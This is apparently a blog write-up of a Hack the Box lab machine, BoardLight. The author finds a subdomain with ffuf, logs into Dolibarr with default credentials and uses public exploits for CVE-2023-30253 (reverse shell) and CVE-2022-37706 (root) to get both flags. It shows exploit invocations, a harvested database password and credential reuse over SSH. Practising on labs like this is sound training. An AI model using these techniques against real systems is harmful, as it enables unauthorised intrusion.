---
draft: false
title: "Hack the Box #4 - BoardLight w/o Metasploit"
date: 2024-08-08
author: William
category:
  - Tech
tags:
  - Hacking
  - Security
  - Linux
cover:
  image: hack_the_box_4_boardlight.png
  alt: hack_the_box_4_boardlight.png
---
This evening I felt like cutting my teeth a little bit more. So lets spin up this box and give it a poke.

---
## Enumeration 

Kicking of this baby with an nmap
![https://i.imgur.com/EOD1dhH.png](https://i.imgur.com/EOD1dhH.png#center)

In doing so we find port 22 and 80 are the only ones open. _I did a full port scan after to the avail of no extra dice_

Browsing the website we don't find much. All links are get requests to the server so nothing there. We do get the website URL however _**Board.htb**_ that we can add to our hosts file.

So lets see what they aren't showing us with a little bit of directory brute forcing with gobuster…

![https://i.imgur.com/TyAgDp1.png](https://i.imgur.com/TyAgDp1.png#center)

Nothing of to much interest. How about subdomains? FUFF!!!! Weirdly when I started out, FUFF would give me all or nothing.

```bash
# All the errors
ffuf -w /usr/.....top100000.txt -u <http://FUZZ.permx.htb> -mc 200 -o ffuf.scan

# Or All the 200s 
ffuf -w /usr/.....top100000.txt -u http://IP_ADDRESS -H "Host: FUZZ.DOMAIN_URL" -mc 200 -o ffuf.scan
```

This had me stumped for longer then I would care to admit… until I discovered a glorious FUFF feature that I’m kicking myself for not knowing `-ac` Auto calibration. Oh where have you been all my life! Once we apply that flag a subdomain pops out in a matter of seconds `crm.board.htb`

![https://i.imgur.com/qE876A5.png](https://i.imgur.com/qE876A5.png#center)

Now we are cooking, with a sus login portal. Looking into the known exploits for this software, we find this git repo [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) but this requires authentication… Default creds for this tool are **admin/admin** but that wont work right… right?!

---
### Exploitation 

Well the creds work, though the permissions seem to be removed, but no matter.
```bash
└─$ python3 exploit.py <http://crm.board.htb> admin admin 10.10.14.62 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

And with that we have a cheeky reverse shell. Looking at the home file we find the user ***larissa***. But lets keep digging in what this dolibarr is… after some googling we find this little nugget of info about the [Configuration file](https://wiki.dolibarr.org/index.php?title=Configuration_file) and can be found at **conf/conf.php**. Whacking this badboy with a grep for db
```bash
<crm.board.htb/htdocs/conf$ cat conf.php | grep "db"  
...
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
...
```
We got a password… Would this work against the user?

```bash
└─$ ssh larissa@10.10.11.11    
larissa@boardlight:~$ cat user.txt
============ USER_FLAG ============
```

oh baby!

---
### Privilege Escalation

Now to start the enumeration of the box. Lets push **linpeas** onto this badboy and run that. In do so Linpeas finds some interesting files with permissions

```bash
...
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                   
                      ╚════════════════════════════════════╝                                                                                         
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid>                                                                     
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                            
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)                                
...
```

and one cursory google search away and we find this cheeky [PrivEsc](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh), pushing it onto the box

```bash
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can\'t find in /etc/fstab.
# whoami
root
# cat /root/root.txt
============ ROOT_FLAG ============
```

With that we are done with both flags in the bag. Its time to treat myself with going outside and touching grass... Just one blade
![Grass.png](https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExdHZiaHY2ZjcwbXEycXp1dnp5cXV5aG5peWtnMWRtODhkaTd0dWQ0NyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/jVk5ebwWGahBS/giphy.gif#center)

Oh and the [rubber stamp](https://www.hackthebox.com/achievement/machine/1695260/603) from hack the box